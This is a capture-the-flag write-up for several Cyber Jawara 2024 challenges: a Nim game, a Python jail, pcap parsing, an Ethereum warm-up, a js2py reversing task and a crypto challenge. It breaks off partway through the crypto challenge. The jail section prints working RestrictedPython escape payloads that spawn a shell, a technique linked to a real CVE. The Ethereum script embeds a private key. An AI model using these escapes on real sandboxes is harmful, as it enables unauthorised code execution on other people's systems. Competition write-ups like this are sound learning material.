---
title: "Intro to ETH - The Cyber Jawara International 2024"
category: "crypto"
subcategory: "network"
type: "writeup"
tags: ["crypto", "xor", "wireshark", "tshark", "scapy", "solidity", "pyjail", "exec", "network", "the-cyber-jawara-international", "the-cyber-jawara-international-202", "2024", "ctf-writeup"]
summary: "Below are my writeups to the Cyber Jawara CTF that I played in last week."
source:
  name: "CTFtime writeup #39626"
  url: "https://ctftime.org/writeup/39626"
original_source: "https://gist.github.com/Lydxn/26679096f7675abc3eb30b7fbfc07541#intro-to-eth-41-solves"
ctf:
  name: "The Cyber Jawara International 2024"
  year: 2024
  challenge: "Intro to ETH"
---

## Metadata

- **CTF:** The Cyber Jawara International 2024
- **Task:** Intro to ETH
- **Author team:** lydxn
- **CTFtime:** <https://ctftime.org/writeup/39626>
- **Original writeup:** <https://gist.github.com/Lydxn/26679096f7675abc3eb30b7fbfc07541#intro-to-eth-41-solves>

---
# The Cyber Jawara International 2024

Below are my writeups to the Cyber Jawara CTF that I played in last week.

## Challenges

  * **misc/Welcome (204 solves)**
  * **misc/Stone Game (94 solves)**
  * **misc/Restricted (1 solve)**
  * **forensics/prepare the tools (46 solves)**
  * **blockchain/Intro to ETH (41 solves)**
  * **rev/Python is Hard (4 solves)**
  * **crypto/Chemistry Lab (1 solve)**


## Welcome (204 solves)

> Welcome to our CTF! Join our Discord server and grab the flag waiting for you there.
> 
> Join our Discord server using the link: <https://discord.gg/w4bK9xqd>
> 
> Flag format: `CJ{[^{}]+}`

The flag was posted in the `#announcements` channel on the Cyber Jawara Discord.

**Flag:`CJ{good_luck_and_have_fun!}`**

## Stone Game (94 solves)

> Welcome to the Stone Game. Take turns with the computer to pick stones from any set. Remove as many as you want, but the one who takes the last stone wins. Plan your moves carefully and try to outsmart the computer.
> 
> `nc 68.183.177.211 10001`

After connecting the server, we are asked to play the _Stone Game_ and win against the bot:

```
    Welcome to the Stone Game! Try to beat the computer.
    
    Rules:
    1. There are 7 sets of stones. Each set has a certain number of stones.
    2. On your turn, pick any set and remove 1 or more stones from it.
    3. You must take at least one stone, and you cannot take more than what is available.
    4. The player who takes the last stone wins!
    
    
    Stones:
    +---+---+---+---+---+---+---+
    | 3 | 4 | 5 | 2 | 6 | 3 | 5 |
    +---+---+---+---+---+---+---+
      1   2   3   4   5   6   7
    
    Your turn! Choose a set of stones (1-7):
```

Based on the rules given, we can see that this is in fact the classic [Nim](https://en.wikipedia.org/wiki/Nim). Nim is a classic strategy in which players take turns removing stones from distinct piles of stones, with the winner being the person to take the last stone.

An elegant strategy to guarantee a win is: on our turn, we eliminate the stones in such a way that the XOR of the number of stones in each pile equals zero. However, if the XOR sum is already zero on our turn, the computer can win with optimal play.

Looking at the starting configuration above, it appears that `3 ^ 4 ^ 5 ^ 2 ^ 6 ^ 3 ^ 5 = 0`. Since we go first, it is impossible to win against the computer, assuming they play optimally! The trick to winning is to notice that we are allowed to choose `0` stones, despite the protocol claiming a number `1-7` must be inputted. With this, we can play `0` on our first turn, and thus force ourselves in a winning position.

To determine which set of stones to eliminate to achieve an XOR sum of zero, I simply brute-forced over all possible moves. There may be a better way, but this was sufficient for the small inputs we were given:

```
    from pwn import *
    
    def find_optimal_move(stones):
        s = 0
        for x in stones:
            s ^= x
    
        if s == 0:
            return (0, 0)
    
        for i in range(len(stones)):
            s = 0
            for j in range(len(stones)):
                if j != i:
                    s ^= stones[j]
            if stones[i] > s:
                return (i, stones[i] - s)
    
    io = remote('68.183.177.211', 10001)
    
    while True:
        io.recvuntil(b'Stones:\r\n')
        io.recvline()
    
        stones = list(map(int, io.recvline().strip(b'\r\n|').split(b' | ')))
        idx, val = find_optimal_move(stones)
    
        s = 0
        for x in stones:
            s ^= x
    
        print(stones, (idx, val), s)
    
        io.sendlineafter(b': ', b'%d' % (idx + 1))
        io.sendlineafter(b'? ', b'%d' % val)
    
        io.recvuntil(b'Stones:\r\n')
        io.recvline()
    
        stones = list(map(int, io.recvline().strip(b'\r\n|').split(b' | ')))
        if sum(stones) == 0:
            break
    
    while True:
        print(io.recvline())
```

**Flag:`CJ{why_I_allowed_zero_:(}`**

## Restricted (1 solve)

> Welcome to another classic PyJail. Given the level of restrictions in place, are you able to escape this time?
> 
> nc 68.183.177.211 10002

_Source code:_

```
    #!/usr/bin/env python3
    from RestrictedPython import compile_restricted
    from RestrictedPython import utility_builtins
    from RestrictedPython import safe_globals
    
    import sys
    
    code = input('Enter code: ')
    banned = '$[#<@;-}>?!&"\']|/^{+%~`\\'
    
    for char in set(code):
        if char in banned:
            exit('Banned character detected')
    
    try:
        byte_code = compile_restricted(code, '<string>', 'exec')
        exec_globals = {**safe_globals, **utility_builtins}
    
        sys.modules['os'].__dict__.clear()
        sys.modules['posix'].__dict__.clear()
        sys.modules.clear()
        for _ in sys.__dict__:
            sys.__dict__[_] = None
        del sys
    
        exec(byte_code, exec_globals, {})
    except:
        pass
```

This challenge was essentially a revamp of [respy nice challenge](https://github.com/jailctf/challenges/tree/main/respy-nice-challenge/solve) from jailCTF 2024. The key changes were:

  * Only the `string` module is allowed, `random` has been removed.
  * A charcater blacklist specified by the `banned` variable.
  * `sys` is completely cleared, as well as the `os/posix` namespaces.


The payload to the original challenge looked like this:

```
    random.seed(13371337)
    try:
        random.Random.randbytes(string, 1)
    except AttributeError as e:
        x = random.choice(e.obj.Formatter().get_field("...", [e.obj], {}))('sh')
```

but due to the above restrictions, we have to be a little more clever. After some hours of trying different things, I came up with the following payload:

```
    try:
        string.capwords(0, string)
    except AttributeError as e:
        string = e.obj
    
        e = string.digits * 0
        p = string.printable
        d = string.digits * 2
        p = p.replace(e, d).split(d)
        FMTSTR = {FMTSTR}
        PAYLOAD = {PAYLOAD}
    
        F = string.Formatter().get_field(FMTSTR, (string,), 0)
        E = string.Formatter().get_value(0, F, 0)
        E(PAYLOAD)
```

where `{FMTSTR}` and `{PAYLOAD}` are replaced with some Python expression that generates arbitrary strnigs using `e` and `p`. More specifically, the code can be generated via this function:

```
    def lol(s):
        table = ['', *string.printable, '']
        return 'e.join((' + ','.join(f'p.copy().pop({table.index(c)})' for c in s) + '))'
```

The `PAYLOAD` part will then be executed in an `exec()` without the restrictions imposed by RestrictedPython. However, that is the only half the battle. We also must get around the removal of `sys`, which turned out to cause more of a headache than I anticipated. Several areas of the `import` functionality depend on `sys`, which meant that an error would occur whenever we try loading a module. Fortunately, I was able to resolve the issue by assinging a few "fake" values to some of the `sys` attributes until Python stopped complaining:

```
    S = ().__class__.__base__.__subclasses__()
    
    type = S[0]
    BuiltinImporter = [x for x in S if x.__name__ == 'BuiltinImporter'][0]
    sys = BuiltinImporter.find_spec.__globals__['sys']
    
    sys.builtin_module_names = ['posix']
    sys.modules = {}
    sys.flags = type('C', (), {'verbose': 0})
    BuiltinImporter.load_module('posix').system('sh')
```

In particular, I needed to "restore" `builtin_module_names`, `modules`, and `flags` in order to call `BuiltinImporter.load_module()` successfully. From this, I was able to open a shell and read out the flag!

**Flag:`CJ{its_y0ur_cl4asic_pyj4il_plus_CVE-2024-47532_283570c6bd}`**

## prepare the tools (46 solves)

> lets preparing our tools!

The handout contains a `.pcapng` file. Opening it in Wireshark and inspecting the TCP packets, we see an enormous amount of packets being sent back and forth, of the form:

```
    flag[1161]aflag[2481] flag[0473]iflag[2590]tflag[3192]iflag[2663]oflag[0802]dflag[0687]oflag[0091]tflag[0051]Sflag[4397]oflag[2480],flag[3788]aflag[3851]nflag[4569]tflag[1432]aflag[3312] flag[3130]cflag[0913]wflag[3352]iflag[1147]dflag[1135]dflag[2369]rflag[0374]uflag[3138]sflag[1230]tflag[4227]hflag[2535]tflag[4682]sflag[1076] flag[3877]rflag[0773]nflag[4893]nflag[1647]
```

We notice that `flag[....]` is always immediately followed by an ASCII char. The pattern implies that the `....`th character of the flag is simply that ASCII char. Parsing out all of these values would take forever by hand, so I wrote a quick `pyshark` script to do it automatically:

```
    import pyshark
    
    cap = pyshark.FileCapture('preparingtools.pcapng')
    
    data = []
    for packet in cap:
        if hasattr(packet.tcp, 'payload'):
            b = bytes(int(c, 16) for c in packet.tcp.payload.split(':')).decode()
            data.append(b)
    
    flag = ['?'] * (len(data) // 2)
    
    for i in range(0, len(data), 2):
        idx = int(data[i][5:-1])
        c = data[i + 1]
        flag[idx] = c
    
    print(''.join(flag))
```

Program output:

```
    ...
    The next day, Severus concocted a potion that would create colorful smoke, drawing everyone’s attention. He placed it strategically near the entrance of the Great Hall during lunch. As the smoke erupted in a dazzling array of colors, the Marauders rushed to investigate, leaving Lily momentarily alone.
    Seizing the opportunity, Severus dashed to her side. “Lily! Please, I need to tell you about CJ{warm_up_for_your_scapy/pyshark/tshark}. It’s about how you can enhance your charms study and bypass the Marauders’ tricks!”
    Lily blinked in surprise, her eyes wide with curiosity. “What? That sounds fascinating! Tell me more!”
    ...
```

**Flag:`CJ{warm_up_for_your_scapy/pyshark/tshark}`**

## Intro to ETH (41 solves)

> Welcome to the world of Ethereum smart contracts! This warmup challenge is designed to introduce newcomers to the basics of interacting with Ethereum blockchain technology. You'll get hands-on experience with a simple smart contract, learning how to read and interact with it. No prior blockchain knowledge is required – just bring your curiosity and problem-solving skills. Are you ready to take your first steps into the exciting realm of decentralized applications?

<http://152.42.183.87:59117>

This was just an introductory ETH challenge to get familiar with the protocol:

```
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.0;
    
    contract Setup {
        bool private solved;
    
        constructor() payable {
        }
    
        function solve(bytes calldata secret) public {
            require(keccak256(secret) == keccak256(bytes("CJ_INTERNATIONAL_2024-CHOVID99")), "Wrong password");
            solved = true;
        }
    
        function isSolved() external view returns (bool) {
            return solved;
        }
    }
```

We are given a very basic `Setup` contract with one public function, `solve(bytes calldata secret)`. If the `keccak256` hash of `secret` matches the `keccak256` hash of the string `CJ_INTERNATIONAL_2024-CHOVID99`, then we have solved the challenge. Basically, we just need to call `solve("CJ_INTERNATIONAL_2024-CHOVID99")`.

Admittedly, I don't really know any blockchain myself, so I just followed a tutorial that demonstrated a way to interact with the contract via Web3. Below is the script I used to solve the challenge:

```
    from web3 import Web3
    import solcx
    
    uuid = '5817fa30-fb39-4d1f-9659-0f4a53daed13'
    rpc_url = 'http://152.42.183.87:59117/5817fa30-fb39-4d1f-9659-0f4a53daed13'
    private_key = '0x6147e459dd86684293ad7d27da529b255a962efd259f1d7010d9cc7664878d4a'
    setup_contract = '0x9b4aCC02ff7adeeeCC6BC6EE0A28DE18C3726088'
    wallet = '0xf93f388c3A71B6B3C8Ac97236Cc06Fe0BD16C790'
    
    w3 = Web3(Web3.HTTPProvider(rpc_url))
    if not w3.is_connected():
        print('Not connected to blockchain')
        exit()
    
    def get_contract(filename, address):
        solcx.install_solc(version='0.8.0')
        solcx.set_solc_version('0.8.0')
    
        compiled_sol = solcx.compile_files([filename], output_values=['abi', 'bin'])
        key = filename + ':' + filename[2:].split('.')[0]
        contract_interface = compiled_sol[key]
    
        return w3.eth.contract(address=address, abi=contract_interface['abi'])
    
    SetupContract = get_contract('./Setup.sol', setup_contract)
    print(SetupContract.functions.solve(b'CJ_INTERNATIONAL_2024-CHOVID99').transact())
```

**Flag:`CJ{m0mMy_I_s0lv3d_bL0cKch41n_ch4ll3ng3zZ}`**

## Python is Hard (4 solves)

> Let's do a warm up with python flag checker challenge. Wrap the correct input with flag format `CJ{}`.
> 
> `SHA256(flag) == aadcd5661a83fdeca93720872214bbbc949c8fc38be4a2fb4204b1419b5facc9`

The `chall.py` code is initially an `exec()` called on `zlib + base64` a bunch of times. After unwrapping all of the fluff, the actual source code is revealed:

```
    import pyjsparser
    from js2py.internals.space import Space
    from js2py.internals import fill_space
    from js2py.internals.byte_trans import ByteCodeGenerator
    from js2py.internals.code import Code
    from js2py.internals.simplex import *
    from js2py.internals.opcodes import *
    
    a = ByteCodeGenerator(Code(debug_mode=False))
    s = Space()
    
    a.exe.space = s
    s.exe = a.exe
    
    d = pyjsparser.parse("")
    
    a.emit(d)
    
    fill_space.fill_space(s, a)
    
    a.exe.tape = [LOAD_UNDEFINED(), LOAD_STRING(input("Input flag: "),), STORE('inp',), POP(), LOAD_ARRAY(0,), STORE('a',), POP(), LOAD_ARRAY(0,), STORE('b',), POP(), LOAD_ARRAY(0,), STORE('c',), POP(), LOAD_ARRAY(0,), STORE('d',), POP(), LOAD_NUMBER(0.0,), STORE('i',), POP(), JUMP(3,), LABEL(1,), LOAD_NUMBER(4.0,), STORE_OP('i', '+'), POP(), LABEL(3,), LOAD('i',), LOAD_NUMBER(36.0,), BINARY_OP('<',), JUMP_IF_FALSE(2,), LOAD_NUMBER(0.0,), STORE('tmp',), POP(), LOAD_NUMBER(0.0,), STORE('j',), POP(), JUMP(6,), LABEL(4,), POSTFIX(1, -1, 'j'), POP(), LABEL(6,), LOAD('j',), LOAD_NUMBER(4.0,), BINARY_OP('<',), JUMP_IF_FALSE(5,), POP(), LOAD('inp',), LOAD('i',), LOAD('j',), BINARY_OP('+',), LOAD_N_TUPLE(1,), CALL_METHOD_DOT('charCodeAt',), LOAD('j',), LOAD_NUMBER(8.0,), BINARY_OP('*',), BINARY_OP('<<',), STORE_OP('tmp', '|'), JUMP(4,), LABEL(5,), POP(), LOAD('a',), LOAD('tmp',), LOAD_N_TUPLE(1,), CALL_METHOD_DOT('push',), JUMP(1,), LABEL(2,), LOAD_NUMBER(0.0,), STORE('i',), POP(), JUMP(9,), LABEL(7,), LOAD_NUMBER(2.0,), STORE_OP('i', '+'), POP(), LABEL(9,), LOAD('i',), LOAD_NUMBER(36.0,), BINARY_OP('<',), JUMP_IF_FALSE(8,), LOAD_NUMBER(0.0,), STORE('tmp',), POP(), LOAD_NUMBER(0.0,), STORE('j',), POP(), JUMP(12,), LABEL(10,), POSTFIX(1, -1, 'j'), POP(), LABEL(12,), LOAD('j',), LOAD_NUMBER(2.0,), BINARY_OP('<',), JUMP_IF_FALSE(11,), POP(), LOAD('inp',), LOAD('i',), LOAD('j',), BINARY_OP('+',), LOAD_N_TUPLE(1,), CALL_METHOD_DOT('charCodeAt',), LOAD('j',), LOAD_NUMBER(8.0,), BINARY_OP('*',), BINARY_OP('<<',), STORE_OP('tmp', '|'), JUMP(10,), LABEL(11,), POP(), LOAD('b',), LOAD('tmp',), LOAD_N_TUPLE(1,), CALL_METHOD_DOT('push',), JUMP(7,), LABEL(8,), LOAD_NUMBER(0.0,), STORE('i',), POP(), JUMP(15,), LABEL(13,), LOAD_NUMBER(1.0,), STORE_OP('i', '+'), POP(), LABEL(15,), LOAD('i',), LOAD_NUMBER(36.0,), BINARY_OP('<',), JUMP_IF_FALSE(14,), LOAD_NUMBER(0.0,), STORE('tmp',), POP(), LOAD_NUMBER(0.0,), STORE('j',), POP(), JUMP(18,), LABEL(16,), POSTFIX(1, -1, 'j'), POP(), LABEL(18,), LOAD('j',), LOAD_NUMBER(1.0,), BINARY_OP('<',), JUMP_IF_FALSE(17,), POP(), LOAD('inp',), LOAD('i',), LOAD('j',), BINARY_OP('+',), LOAD_N_TUPLE(1,), CALL_METHOD_DOT('charCodeAt',), LOAD('j',), LOAD_NUMBER(8.0,), BINARY_OP('*',), BINARY_OP('<<',), STORE_OP('tmp', '|'), JUMP(16,), LABEL(17,), POP(), LOAD('c',), LOAD('tmp',), LOAD_N_TUPLE(1,), CALL_METHOD_DOT('push',), JUMP(13,), LABEL(14,), LOAD('a',), LOAD_NUMBER(3.0,), LOAD_MEMBER(), LOAD('b',), LOAD_NUMBER(5.0,), LOAD_MEMBER(), LOAD('b',), LOAD_NUMBER(15.0,), LOAD_MEMBER(), BINARY_OP('+',), LOAD('c',), LOAD_NUMBER(12.0,), LOAD_MEMBER(), LOAD('c',), LOAD_NUMBER(5.0,), LOAD_MEMBER(), BINARY_OP('+',), LOAD('c',), LOAD_NUMBER(28.0,), LOAD_MEMBER(), BINARY_OP('-',), BINARY_OP('^',), LOAD('c',), LOAD_NUMBER(19.0,), LOAD_MEMBER(), BINARY_OP('^',), LOAD_NUMBER(1337.0,), BINARY_OP('^',), BINARY_OP('+',), LOAD_NUMBER(1634073638.0,), BINARY_OP('==',), JUMP_IF_FALSE_WITHOUT_POP(28,), POP(), LOAD('a',), LOAD_NUMBER(8.0,), LOAD_MEMBER(), LOAD('b',), LOAD_NUMBER(16.0,), LOAD_MEMBER(), LOAD('b',), LOAD_NUMBER(7.0,), LOAD_MEMBER(), BINARY_OP('^',), LOAD('c',), LOAD_NUMBER(2.0,), LOAD_MEMBER(), LOAD('c',), LOAD_NUMBER(33.0,), LOAD_MEMBER(), BINARY_OP('+',), LOAD('c',), LOAD_NUMBER(22.0,), LOAD_MEMBER(), BINARY_OP('+',), LOAD('c',), LOAD_NUMBER(8.0,), LOAD_MEMBER(), BINARY_OP('+',), LOAD_NUMBER(1337.0,), BINARY_OP('-',), BINARY_OP('^',), LOAD_NUMBER(892560024.0,), UNARY_OP('-',), BINARY_OP('==',), BINARY_OP('^',), LABEL(28,), JUMP_IF_FALSE_WITHOUT_POP(27,), POP(), LOAD('a',), LOAD_NUMBER(2.0,), LOAD_MEMBER(), LOAD('b',), LOAD_NUMBER(10.0,), LOAD_MEMBER(), LOAD('b',), LOAD_NUMBER(2.0,), LOAD_MEMBER(), BINARY_OP('+',), LOAD('c',), LOAD_NUMBER(3.0,), LOAD_MEMBER(), LOAD('c',), LOAD_NUMBER(20.0,), LOAD_MEMBER(), BINARY_OP('+',), BINARY_OP('^',), LOAD('c',), LOAD_NUMBER(7.0,), LOAD_MEMBER(), LOAD('c',), LOAD_NUMBER(25.0,), LOAD_MEMBER(), BINARY_OP('-',), LOAD_NUMBER(1337.0,), BINARY_OP('+',), BINARY_OP('^',), BINARY_OP('+',), LOAD_NUMBER(1767917691.0,), BINARY_OP('==',), LABEL(27,), JUMP_IF_FALSE_WITHOUT_POP(26,), POP(), LOAD('a',), LOAD_NUMBER(5.0,), LOAD_MEMBER(), LOAD('b',), LOAD_NUMBER(14.0,), LOAD_MEMBER(), LOAD('b',), LOAD_NUMBER(13.0,), LOAD_MEMBER(), BINARY_OP('-',), LOAD('c',), LOAD_NUMBER(10.0,), LOAD_MEMBER(), BINARY_OP('+',), LOAD('c',), LOAD_NUMBER(11.0,), LOAD_MEMBER(), LOAD('c',), LOAD_NUMBER(29.0,), LOAD_MEMBER(), BINARY_OP('-',), BINARY_OP('^',), LOAD('c',), LOAD_NUMBER(13.0,), LOAD_MEMBER(), LOAD_NUMBER(1337.0,), BINARY_OP('+',), BINARY_OP('^',), BINARY_OP('+',), LOAD_NUMBER(1948741702.0,), BINARY_OP('==',), LABEL(26,), JUMP_IF_FALSE_WITHOUT_POP(25,), POP(), LOAD('a',), LOAD_NUMBER(4.0,), LOAD_MEMBER(), LOAD('b',), LOAD_NUMBER(4.0,), LOAD_MEMBER(), LOAD('b',), LOAD_NUMBER(17.0,), LOAD_MEMBER(), BINARY_OP('-',), LOAD('c',), LOAD_NUMBER(1.0,), LOAD_MEMBER(), BINARY_OP('+',), LOAD('c',), LOAD_NUMBER(16.0,), LOAD_MEMBER(), LOAD('c',), LOAD_NUMBER(27.0,), LOAD_MEMBER(), BINARY_OP('-',), LOAD('c',), LOAD_NUMBER(26.0,), LOAD_MEMBER(), BINARY_OP('-',), BINARY_OP('^',), LOAD_NUMBER(1337.0,), BINARY_OP('^',), BINARY_OP('+',), LOAD_NUMBER(1767849594.0,), BINARY_OP('==',), LABEL(25,), JUMP_IF_FALSE_WITHOUT_POP(24,), POP(), LOAD('a',), LOAD_NUMBER(1.0,), LOAD_MEMBER(), LOAD('b',), LOAD_NUMBER(6.0,), LOAD_MEMBER(), LOAD('b',), LOAD_NUMBER(12.0,), LOAD_MEMBER(), BINARY_OP('-',), LOAD('c',), LOAD_NUMBER(18.0,), LOAD_MEMBER(), BINARY_OP('+',), LOAD('c',), LOAD_NUMBER(4.0,), LOAD_MEMBER(), LOAD('c',), LOAD_NUMBER(17.0,), LOAD_MEMBER(), BINARY_OP('-',), BINARY_OP('^',), LOAD('c',), LOAD_NUMBER(23.0,), LOAD_MEMBER(), BINARY_OP('^',), LOAD_NUMBER(1337.0,), BINARY_OP('^',), BINARY_OP('-',), LOAD_NUMBER(1769100975.0,), BINARY_OP('==',), LABEL(24,), JUMP_IF_FALSE_WITHOUT_POP(23,), POP(), LOAD('a',), LOAD_NUMBER(0.0,), LOAD_MEMBER(), LOAD('b',), LOAD_NUMBER(0.0,), LOAD_MEMBER(), LOAD('b',), LOAD_NUMBER(1.0,), LOAD_MEMBER(), LOAD('c',), LOAD_NUMBER(9.0,), LOAD_MEMBER(), BINARY_OP('-',), BINARY_OP('^',), LOAD('c',), LOAD_NUMBER(21.0,), LOAD_MEMBER(), LOAD('c',), LOAD_NUMBER(30.0,), LOAD_MEMBER(), BINARY_OP('-',), LOAD('c',), LOAD_NUMBER(32.0,), LOAD_MEMBER(), BINARY_OP('+',), LOAD_NUMBER(1337.0,), BINARY_OP('+',), BINARY_OP('^',), LOAD_NUMBER(1635149008.0,), BINARY_OP('==',), BINARY_OP('^',), LABEL(23,), JUMP_IF_FALSE_WITHOUT_POP(22,), POP(), LOAD('a',), LOAD_NUMBER(6.0,), LOAD_MEMBER(), LOAD('b',), LOAD_NUMBER(8.0,), LOAD_MEMBER(), LOAD('b',), LOAD_NUMBER(9.0,), LOAD_MEMBER(), BINARY_OP('-',), LOAD('c',), LOAD_NUMBER(31.0,), LOAD_MEMBER(), LOAD('c',), LOAD_NUMBER(14.0,), LOAD_MEMBER(), BINARY_OP('-',), LOAD('c',), LOAD_NUMBER(6.0,), LOAD_MEMBER(), BINARY_OP('-',), LOAD('c',), LOAD_NUMBER(35.0,), LOAD_MEMBER(), BINARY_OP('-',), LOAD_NUMBER(1337.0,), BINARY_OP('-',), BINARY_OP('^',), BINARY_OP('+',), LOAD_NUMBER(1601459038.0,), BINARY_OP('==',), LABEL(22,), JUMP_IF_FALSE_WITHOUT_POP(21,), POP(), LOAD('a',), LOAD_NUMBER(7.0,), LOAD_MEMBER(), LOAD('b',), LOAD_NUMBER(3.0,), LOAD_MEMBER(), LOAD('b',), LOAD_NUMBER(11.0,), LOAD_MEMBER(), BINARY_OP('-',), LOAD('c',), LOAD_NUMBER(15.0,), LOAD_MEMBER(), BINARY_OP('-',), LOAD('c',), LOAD_NUMBER(0.0,), LOAD_MEMBER(), BINARY_OP('+',), LOAD('c',), LOAD_NUMBER(24.0,), LOAD_MEMBER(), BINARY_OP('-',), LOAD('c',), LOAD_NUMBER(34.0,), LOAD_MEMBER(), LOAD_NUMBER(1337.0,), BINARY_OP('-',), BINARY_OP('^',), BINARY_OP('+',), LOAD_NUMBER(809005425.0,), BINARY_OP('==',), LABEL(21,), JUMP_IF_FALSE(19,), POP(), LOAD('console',), LOAD_STRING('congrats',), LOAD_N_TUPLE(1,), CALL_METHOD_DOT('log',), JUMP(20,), LABEL(19,), POP(), LOAD('console',), LOAD_STRING('failed',), LOAD_N_TUPLE(1,), CALL_METHOD_DOT('log',), LABEL(20,)]
    a.exe.compile()
    a.exe.run(a.exe.space.GlobalObj)
```

I have never heard of this library, but it looks to execute a JS VM inside of Python via stack-based instructions. This is definitely some cursed Python! Regardless, the first thing I did was paste the instructions into ChatGPT to see if I could get some more readable output.

Surprisingly, the output was rather accurate.

```
    def main():
        inp = 'CJ{fake_flag}'
        a, b, c, d = [], [], [], []
    
        # First Loop - Processes 'a'
        i = 0
        while i < 36:
            tmp = 0
            for j in range(4):
                tmp |= ord(inp[i + j]) << (j * 8)
            a.append(tmp)
            i += 4
    
        # Second Loop - Processes 'b'
        i = 0
        while i < 36:
            tmp = 0
            for j in range(2):
                tmp |= ord(inp[i + j]) << (j * 8)
            b.append(tmp)
            i += 2
    
        # Third Loop - Processes 'c'
        i = 0
        while i < 36:
            tmp = 0
            tmp |= ord(inp[i]) << 8  # Assumes single char per loop for 'c'
            c.append(tmp)
            i += 1
    
        print(a)
        print(b)
        print(c)
    
        # Condition checks
        if (a[3] + b[5] + b[15] ^ c[12] + c[5] - c[28] ^ c[19] ^ 1337 + 1634073638 == 0 and
            a[8] ^ b[16] ^ b[7] + c[2] + c[33] + c[22] + c[8] - 1337 ^ -892560024 == 0 and
            # Additional conditions...
    
            print("congrats")
        else:
            print("failed")
    
    main()
```

The 36-byte input is placed into three buffers, `a`, `b` and `c`. The buffers themselves store the 4-byte, 2-byte and 1-byte little endian representations of the input string, respetively. It then performs a series of condition checks which validate the flag. The nature of the constraints looked very `z3`-able, so I took the ChatGPT conditions and tried solving it.

Unfortunately, ChatGPT's output is not perfect, so my constraints ended up being incorrect. The next thing I tried was actually emulating the instructions by defining functions for each instrution and pushing and popping values off a global stack to reconstruct the equations. This actually turned out to be quite fruitful:

```
    stk = []
    
    def LOAD(x):
        stk.append(f'{x}')
    
    def LOAD_NUMBER(x):
        stk.append(f'{int(x)}')
    
    def LOAD_MEMBER():
        y, x = stk.pop(), stk.pop()
        stk.append(f'{x}[{y}]')
    
    def BINARY_OP(op):
        y, x = stk.pop(), stk.pop()
        stk.append(f'({x}{op}{y})')
    
    def JUMP_IF_FALSE_WITHOUT_POP(x):
        pass
    
    def LABEL(x):
        pass
    
    def UNARY_OP(op):
        x = stk.pop()
        stk.append(f'-{x}')
    
    def POP():
        pass
    
    commands = [LOAD('a',), LOAD_NUMBER(3.0,), LOAD_MEMBER(), LOAD('b',), ...]
    
    for line in stk:
        print(line)
```

Using the above script, I received these set of nine constraints:

```
    ((a[3]+((((b[5]+b[15])^((c[12]+c[5])-c[28]))^c[19])^1337))==1634073638)
    (a[8]^(((b[16]^b[7])^((((c[2]+c[33])+c[22])+c[8])-1337))==-892560024))
    ((a[2]+(((b[10]+b[2])^(c[3]+c[20]))^((c[7]-c[25])+1337)))==1767917691)
    ((a[5]+((((b[14]-b[13])+c[10])^(c[11]-c[29]))^(c[13]+1337)))==1948741702)
    ((a[4]+((((b[4]-b[17])+c[1])^((c[16]-c[27])-c[26]))^1337))==1767849594)
    ((a[1]-(((((b[6]-b[12])+c[18])^(c[4]-c[17]))^c[23])^1337))==1769100975)
    (a[0]^(((b[0]^(b[1]-c[9]))^(((c[21]-c[30])+c[32])+1337))==1635149008))
    ((a[6]+((b[8]-b[9])^((((c[31]-c[14])-c[6])-c[35])-1337)))==1601459038)
    ((a[7]+(((((b[3]-b[11])-c[15])+c[0])-c[24])^(c[34]-1337)))==809005425)
```

But feeding the result into `z3` still gave an error. Then I realized that some of the equations (e.g. the 2nd one) had the `==` wrapped _within_ an arithmetic expression! This was quite odd since I could not find any issue in my previous script, but by fixing it so that the `==` was on the outside, the code magically worked... anyway, here's the full solve script:

```
    from z3 import *
    
    flag = [BitVec('c_%d' % i, 32) for i in range(36)]
    
    s = Solver()
    a, b, c = [], [], []
    
    for x in flag:
        s.add(32 <= x, x < 127)
    
    i = 0
    while i < 36:
        tmp = 0
        for j in range(4):
            tmp |= flag[i + j] << (j * 8)
        a.append(tmp)
        i += 4
    
    i = 0
    while i < 36:
        tmp = 0
        for j in range(2):
            tmp |= flag[i + j] << (j * 8)
        b.append(tmp)
        i += 2
    
    i = 0
    while i < 36:
        tmp = 0
        for j in range(1):
            tmp |= flag[i + j] << (j * 8)
        c.append(tmp)
        i += 1
    
    constraints = [
        ((a[3]+((((b[5]+b[15])^((c[12]+c[5])-c[28]))^c[19])^1337))==1634073638),
        (a[8]^(((b[16]^b[7])^((((c[2]+c[33])+c[22])+c[8])-1337)))==-892560024),
        ((a[2]+(((b[10]+b[2])^(c[3]+c[20]))^((c[7]-c[25])+1337)))==1767917691),
        ((a[5]+((((b[14]-b[13])+c[10])^(c[11]-c[29]))^(c[13]+1337)))==1948741702),
        ((a[4]+((((b[4]-b[17])+c[1])^((c[16]-c[27])-c[26]))^1337))==1767849594),
        ((a[1]-(((((b[6]-b[12])+c[18])^(c[4]-c[17]))^c[23])^1337))==1769100975),
        (a[0]^(((b[0]^(b[1]-c[9]))^(((c[21]-c[30])+c[32])+1337)))==1635149008),
        ((a[6]+((b[8]-b[9])^((((c[31]-c[14])-c[6])-c[35])-1337)))==1601459038),
        ((a[7]+(((((b[3]-b[11])-c[15])+c[0])-c[24])^(c[34]-1337)))==809005425),
    ]
    
    for con in constraints:
        s.add(con)
    
    while s.check() == sat:
        model = s.model()
        res = bytes(model[x].as_long() for x in flag)
        print(res)
        s.add(Or([x != y for x, y in zip(res, flag)]))
```

There were multiple possible answers from the model but only one of them made sense, which I promptly verified using the provided flag hash.

**Flag:`CJ{javascript_is_easy_isn't_it_bc80c935}`**

## Chemistry Lab (1 solve)

> Checkout my new chemistry experiment on using Deoxyribonucleic acid (DNA) to encrypt images securely :)
> 
> `nc 68.183.177.211 4444`

This challenge is somewhat overwhelming in the amount of matrix/string transformations that it tries to perform, but it is actually quite straightfoward if we keep track of everything that is going on.

There are several global values that stay constant throughout the entire program:

  * `height/width`: the height and width of `flag.png`.
  * `dna_encoded_flag`: the DNA-encoded representation of `flag.png`'s RGB pixel matrix.
  * `formula`: a random `height` by `width` matrix of bytes.
  * `dna_encoded_formula`: the DNA-encoded representation of `formula`.
  * `lx/ly`: a random permutation of size `width` and `height`, respectively.


All of these are unknown, except for `height` and `width` which can be easily extracted from the protocol.

The program converts often between two "representations", the matrix form and its corresponding DNA form, which is a string of `ATCG`s. The DNA form is mostly used to obtain a nice, printable form of the matrix, so we can mostly ignore it and focus on the matrix transformations.

We have three options upon connecting to the server:

  * _Get encrypted formula_
  * _Get encrypted input_
  * _Get encrypted flag_


The last option is only available upon guessing `formula`, so the goal will be to somehow find `formula` using the other two protocols.

_Get encrypted formula_ returns `formula`, but it is encrypted by the following procedure:

  * The rows and columns are shuffled using the indices of the permutations `lx` and `ly`.
